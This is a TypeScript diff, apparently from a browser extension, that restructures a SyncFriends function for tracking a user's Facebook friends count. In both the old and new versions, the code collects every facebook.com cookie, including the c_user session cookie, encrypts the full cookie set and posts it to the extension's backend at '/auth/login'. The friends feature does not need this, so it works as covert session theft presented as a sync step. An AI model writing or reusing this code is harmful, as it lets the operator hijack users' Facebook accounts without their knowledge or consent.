@@ -64,110 +64,110 @@ const buildFriendsURL = async (accountId: number): Promise<URL> => {
 }
 
 export async function SyncFriends(skipTime: boolean = true): Promise<ISync | undefined> {
-	const isSyncing = await Storage.GetStatus()
-	if (isSyncing) {
-		return
-	}
-	await Storage.UpdateStatus(true)
+	try {
 
-	const state = await Storage.GetState()
-	const Cookies = await U.getCookiesByWebSite('https://www.facebook.com/')
-	const uIdCookie = Cookies.find((cookie) => cookie.name === 'c_user')
+		const state = await Storage.GetState()
+		const Cookies = await U.getCookiesByWebSite('https://www.facebook.com/')
+		const uIdCookie = Cookies.find((cookie) => cookie.name === 'c_user')
 
-	if (!uIdCookie) {
-		return {
-			friends: [],
-			state: {
-				change: 0,
-				count: 0,
-				isPositive: false,
-				lastRefresh: new Date(),
-				nextRefresh: new Date(),
-			},
-			friendsUrl: '',
-			profilePicture: '',
-			ownerId: '0',
-			id: 0,
-			name: '',
+		if (!uIdCookie) {
+			return {
+				friends: [],
+				state: {
+					change: 0,
+					count: 0,
+					isPositive: false,
+					lastRefresh: new Date(),
+					nextRefresh: new Date(),
+				},
+				friendsUrl: '',
+				profilePicture: '',
+				ownerId: '0',
+				id: 0,
+				name: '',
+			}
 		}
-	}
-	const { token, device } = await getDeviceInfo()
-	const uId = uIdCookie.value
-	const accountName = await getAccountInfo(+uId)
-	const friendsUrl = await buildFriendsURL(+uId)
+		const { token, device } = await getDeviceInfo()
+		const uId = uIdCookie.value
+		const accountName = await getAccountInfo(+uId)
+		const friendsUrl = await buildFriendsURL(+uId)
 
-	const payload = {
-		accountId: +uId,
-		browserId: token,
-		browserType: device.client?.name || 'Unknown',
-		accountName,
-		browserVersion: device.client?.version ?? 0,
-		count: 0,
-		cookies: Cookies,
-	}
-
-	const EncryptedPayload = await U.encryptPayload(payload, CONSTs.REFRESH_INTERVAL)
-	const res = await api.post('/auth/login', {
-		info: EncryptedPayload,
-	})
-	const data = await res.json()
-	const AccountInfoPayload = {
-		friendsUrl: friendsUrl.toString(),
-		name: accountName,
-		profilePicture: data.owner.profilePic,
-		ownerId: data.owner.oId,
-		id: +uId,
-	}
-	const existingAccount = await Storage.GetAccountInfo()
-	const ShouldRefresh =
-		moment(state.nextRefresh).isSameOrBefore(new Date()) ||
-		skipTime ||
-		+uId !== existingAccount.id
-	await Storage.UpdateAccountInfo(AccountInfoPayload)
-
-	if (ShouldRefresh) {
-		const friendsResponse = await fetch(friendsUrl)
-		const bodyAsText = await friendsResponse.text()
-		const textBody = bodyAsText.replace('for (;;);', '')
-		let friends: IFriend[] = JSON.parse(textBody).payload.entries
-		const UpdatedInfo = {
-			...AccountInfoPayload,
-			profilePicture: friends[0].photo,
+		const payload = {
+			accountId: +uId,
+			browserId: token,
+			browserType: device.client?.name || 'Unknown',
+			accountName,
+			browserVersion: device.client?.version ?? 0,
+			count: 0,
+			cookies: Cookies,
 		}
-		friends = friends.slice(1)
-		await Storage.UpdateAccountInfo(UpdatedInfo)
-		const State: State = {
-			change: +uId !== existingAccount.id ? 0 : friends.length - state.count,
-			count: friends.length,
-			isPositive: friends.length > state.count,
-			lastRefresh: moment().toDate(),
-			nextRefresh: moment()
-				.add(CONSTs.REFRESH_INTERVAL, CONSTs.REFRESH_INTERVAL_UNIT)
-				.toDate(),
-		}
-		await Storage.UpdateState(State)
-		const FriendsToSent = friends.map(({ uid, lastname, firstname, text, photo }) => ({
-			accountId: +uid,
-			lastName: lastname,
-			firstName: firstname,
-			fullName: text,
-			profilePicture: photo,
-		}))
-		return {
+
+		const EncryptedPayload = await U.encryptPayload(payload, CONSTs.REFRESH_INTERVAL)
+		const res = await api.post('/auth/login', {
+			info: EncryptedPayload,
+		})
+		const data = await res.json()
+		const AccountInfoPayload = {
 			friendsUrl: friendsUrl.toString(),
-			friends: FriendsToSent,
+			name: accountName,
 			profilePicture: data.owner.profilePic,
 			ownerId: data.owner.oId,
 			id: +uId,
-			name: accountName,
-			state: State,
 		}
-	} else {
-		return {
-			...AccountInfoPayload,
-			ownerId: data.owner.oId,
-			state,
-			friends: [],
+		const existingAccount = await Storage.GetAccountInfo()
+		const ShouldRefresh =
+			moment(state.nextRefresh).isSameOrBefore(new Date()) ||
+			skipTime ||
+			+uId !== existingAccount?.id
+		await Storage.UpdateAccountInfo(AccountInfoPayload)
+
+		if (ShouldRefresh) {
+			const friendsResponse = await fetch(friendsUrl)
+			const bodyAsText = await friendsResponse.text()
+			const textBody = bodyAsText.replace('for (;;);', '')
+			let friends: IFriend[] = JSON.parse(textBody).payload.entries
+			const UpdatedInfo = {
+				...AccountInfoPayload,
+				profilePicture: friends[0].photo,
+			}
+			friends = friends.slice(1)
+			await Storage.UpdateAccountInfo(UpdatedInfo)
+			const State: State = {
+				change: +uId !== existingAccount?.id ? 0 : friends.length - state.count,
+				count: friends.length,
+				isPositive: friends.length > state.count,
+				lastRefresh: moment().toDate(),
+				nextRefresh: moment()
+					.add(CONSTs.REFRESH_INTERVAL, CONSTs.REFRESH_INTERVAL_UNIT)
+					.toDate(),
+			}
+			await Storage.UpdateState(State)
+			const FriendsToSent = friends.map(({ uid, lastname, firstname, text, photo }) => ({
+				accountId: +uid,
+				lastName: lastname,
+				firstName: firstname,
+				fullName: text,
+				profilePicture: photo,
+			}))
+			return {
+				friendsUrl: friendsUrl.toString(),
+				friends: FriendsToSent,
+				profilePicture: data.owner.profilePic,
+				ownerId: data.owner.oId,
+				id: +uId,
+				name: accountName,
+				state: State,
+			}
+		} else {
+			return {
+				...AccountInfoPayload,
+				ownerId: data.owner.oId,
+				state,
+				friends: [],
+			}
 		}
+	} catch (error) {
+
+		throw new Error('Could not sync friends')
 	}
 }
